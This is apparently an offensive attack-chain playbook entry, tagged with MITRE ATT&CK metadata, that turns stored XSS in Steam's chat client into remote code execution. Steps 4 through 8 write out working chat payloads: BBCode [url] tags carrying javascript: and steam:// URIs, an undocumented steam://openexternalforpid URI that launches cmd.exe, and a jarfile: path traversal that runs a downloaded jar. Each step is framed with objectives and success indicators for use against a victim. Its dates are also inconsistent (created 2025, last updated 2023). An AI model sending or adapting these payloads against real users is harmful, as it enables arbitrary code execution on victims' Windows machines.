---
tags:
  - xss
  - rce
  - uri-abuse
  - steam
  - bbcode
type: attack_chain
tools:
  - '[[tools/Chrome-DevTools]]'
  - '[[tools/React-Developer-Tools]]'
  - '[[tools/Binary-Grep]]'
  - '[[tools/Vim]]'
  - '[[tools/Remote-Chrome-Console]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Discovery]]'
  - '[[Lateral Movement]]'
commands:
  - '[[commands/steam-open-game]]'
  - '[[commands/steam-open-console]]'
  - '[[commands/window-top-postmessage]]'
  - '[[commands/open-steam-uri]]'
  - '[[commands/object-keys-window]]'
  - '[[commands/steam-openexternalforpid-jarfile]]'
  - '[[commands/steam-openexternalforpid-file]]'
  - '[[commands/custom-protocol-txt]]'
  - '[[commands/custom-protocol-calculator]]'
  - '[[commands/custom-protocol-jarfile-traversal]]'
  - '[[commands/custom-protocol-jarfile-path]]'
platforms:
  - Web
  - Windows
  - CEF
complexity: high
procedures:
  - '[[procedures/Reconnaissance-on-Steam-Chat-Application]]'
  - '[[procedures/Search-for-XSS-Vectors-in-React-Code]]'
  - '[[procedures/Analyze-and-Test-BBCode-Handling]]'
  - '[[procedures/Exploit-XSS-with-JavaScript-and-Steam-URIs]]'
  - '[[procedures/Abuse-OEMBED-for-JavaScript-Injection]]'
  - '[[procedures/Reverse-Engineer-Steam-Binary-for-Undocumented-URIs]]'
  - '[[procedures/Explore-Custom-Protocols-and-Directory-Traversal]]'
  - '[[procedures/Achieve-RCE-via-Malicious-URL-Tag]]'
step_count: 8
techniques:
  - '[[Command-Line Interface]]'
  - '[[JavaScript]]'
  - '[[Signed Binary Proxy Execution]]'
  - '[[User Execution]]'
description: >-
  Multi-stage attack exploiting stored XSS in Steam's React chat client to
  achieve remote code execution via custom steam:// URI schemes on Windows
  systems.
skill_level: advanced
impact_level: high
id: dfabfc98-e8f4-41ee-95b9-df75dd0c99e5
created_at: '2025-12-11T06:10:22.153Z'
updated_at: '2025-12-11T06:10:22.153Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0002]]'
  - '[[TA0007]]'
  - '[[TA0008]]'
mitre_techniques:
  - '[[T1059]]'
  - '[[T1059.007]]'
  - '[[T1218]]'
  - '[[T1204]]'
---
# Stored XSS to Remote Code Execution in Steam Chat via BBCode and Custom URI Schemes

Multi-stage attack chain demonstrating reconnaissance, vulnerability discovery, and exploitation of stored XSS in Steam's React chat client, escalating to remote code execution by abusing custom steam:// URI schemes to launch arbitrary processes on Windows victims.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 8 |
| Execution Time | ~60 minutes |
| Skill Level | Advanced |
| Complexity | High |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Reconnaissance] --> B[XSS Vector Search]
    B --> C[BBCode Analysis]
    C --> D[XSS Exploitation]
    D --> E[OEMBED Abuse]
    E --> F[Binary Reverse Engineering]
    F --> G[Protocol Exploration]
    G --> H[RCE Achievement]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
    style E fill:#e74c3c
    style F fill:#f39c12
    style G fill:#3498db
    style H fill:#27ae60
```



## Prerequisites & Requirements

### Required Tools

- [[tools/Chrome-DevTools]]
- [[tools/React-Developer-Tools]]
- [[tools/Binary-Grep]]
- [[tools/Vim]]
- [[tools/Remote-Chrome-Console]]

### Target Environment

- Windows OS with Steam client installed
- Steam Chat application (web or desktop)
- Network access to Steam servers via WebSocket

### Initial Access Requirements

- Steam account with chat access to target user
- No prior credentials beyond standard user access

## Detailed Attack Procedures

### Step 1: Reconnaissance - [[procedures/Reconnaissance-on-Steam-Chat-Application]]

**Objective**: Perform initial reconnaissance to understand the Steam Chat application's structure and identify it as a React app.

**Instructions**: Use [[tools/Chrome-DevTools]] to inspect the application at https://steamcommunity.com/chat. Monitor network traffic for WebSocket usage and search for 'OEMBED' to confirm React usage.

**Expected Output**: Identification of WebSocket binary frames and confirmation of React framework.

**Success Indicators**:
- Network traffic shows binary WebSocket frames
- Code inspection reveals React components

### Step 2: XSS Vector Search - [[procedures/Search-for-XSS-Vectors-in-React-Code]]

**Objective**: Search for potential XSS entry points in the React codebase.

**Instructions**: In [[tools/Chrome-DevTools]], search for terms like 'dangerously' or 'innerHTML', set breakpoints on unsafe functions, and trace call stacks to input sanitization functions.

**Expected Output**: Locations where user input is processed without proper sanitization.

**Success Indicators**:
- Breakpoints hit on user input handling
- Call stacks reveal unsanitized paths

### Step 3: BBCode Analysis - [[procedures/Analyze-and-Test-BBCode-Handling]]

**Objective**: Analyze how BBCode is handled and identify exploitable tags like [url].

**Instructions**: Test sending various BBCode tags such as [url=xxx], [code], [image] via chat. Observe double rendering and note that [url] allows arbitrary URLs including javascript: URIs.

**Expected Output**: Confirmation that [url] tags are reflected unsanitized.

**Success Indicators**:
- Messages render with arbitrary URLs
- javascript: URIs execute on click

### Step 4: XSS Exploitation - [[procedures/Exploit-XSS-with-JavaScript-and-Steam-URIs]]

**Objective**: Exploit the XSS to execute JavaScript and escalate to steam:// URI actions.

**Instructions**: Send a message with [url=javascript:alert(1)] for XSS proof. Then use [[commands/steam-open-game]] like steam://open/440 or [[commands/steam-open-console]] like steam://-console to perform privileged actions.

```bash
[url=steam://open/440]click me[/url]
```

```bash
[url=steam://-console]click me[/url]
```

**Expected Output**: JavaScript execution and Steam actions without confirmation.

**Success Indicators**:
- Alert pops up on click
- Game or console opens automatically

### Step 5: OEMBED Abuse - [[procedures/Abuse-OEMBED-for-JavaScript-Injection]]

**Objective**: Use whitelisted OEMBED services to inject JavaScript in iframes.

**Instructions**: Embed a codepen.io URL via OEMBED, then in [[tools/Remote-Chrome-Console]], execute [[commands/window-top-postmessage]], [[commands/open-steam-uri]] like open("steam://xxx"), and [[commands/object-keys-window]] to test access.

```javascript
window.top.postMessage()
```

```javascript
open("steam://xxx")
```

```javascript
Object.keys(window)
```

**Expected Output**: Potential access to privileged APIs.

**Success Indicators**:
- postMessage communicates with parent
- steam:// URIs execute from iframe

### Step 6: Binary Reverse Engineering - [[procedures/Reverse-Engineer-Steam-Binary-for-Undocumented-URIs]]

**Objective**: Discover undocumented steam:// URIs by analyzing the Steam binary.

**Instructions**: Use [[tools/Binary-Grep]] and [[tools/Vim]] to search for known URIs, identifying steam://openexternalforpid/%s/%s. Test with [[commands/steam-openexternalforpid-jarfile]] like steam://openexternalforpid/10400/jarfile:something or [[commands/steam-openexternalforpid-file]] like steam://openexternalforpid/10400/file:///C:/Windows/cmd.exe.

```bash
steam://openexternalforpid/10400/jarfile:something
```

```bash
steam://openexternalforpid/10400/file:///C:/Windows/cmd.exe
```

**Expected Output**: Execution of external processes.

**Success Indicators**:
- New URIs found in binary
- Test executions succeed

### Step 7: Protocol Exploration - [[procedures/Explore-Custom-Protocols-and-Directory-Traversal]]

**Objective**: Test custom Windows protocols and directory traversal for escalation.

**Instructions**: Test protocols like [[commands/custom-protocol-txt]] .txt:hello, [[commands/custom-protocol-calculator]] calculator:, [[commands/custom-protocol-jarfile-traversal]] jarfile:../../../../../../../../../../Users/Username/Downloads/drive-by-download.jar, and [[commands/custom-protocol-jarfile-path]] jarfile:c:/windows/whatever.exe.

```bash
.txt:hello
```

```bash
calculator:
```

```bash
jarfile:../../../../../../../../../../Users/Username/Downloads/drive-by-download.jar
```

```bash
jarfile:c:/windows/whatever.exe
```

**Expected Output**: Execution of local files via traversal.

**Success Indicators**:
- Protocols launch associated apps
- Traversal allows arbitrary file execution

### Step 8: RCE Achievement - [[procedures/Achieve-RCE-via-Malicious-URL-Tag]]

**Objective**: Combine findings to send a malicious [url] tag for RCE.

**Instructions**: Send [url=steam://openexternalforpid/10400/file:///C:/Windows/cmd.exe]click me[/url] via chat using [[commands/steam-openexternalforpid-file]].

```bash
[url=steam://openexternalforpid/10400/file:///C:/Windows/cmd.exe]click me[/url]
```

**Expected Output**: cmd.exe launches on victim's machine.

**Success Indicators**:
- Victim clicks and cmd.exe opens without confirmation
- Arbitrary process execution achieved

## Attack Chain Summary

### Key Achievements

1. Discovered stored XSS via BBCode [url] tags
2. Escalated to steam:// URI abuse for privileged actions
3. Reverse-engineered undocumented URIs for RCE

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Command-Line Interface]]
- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

*Last updated: 2023-10-01*
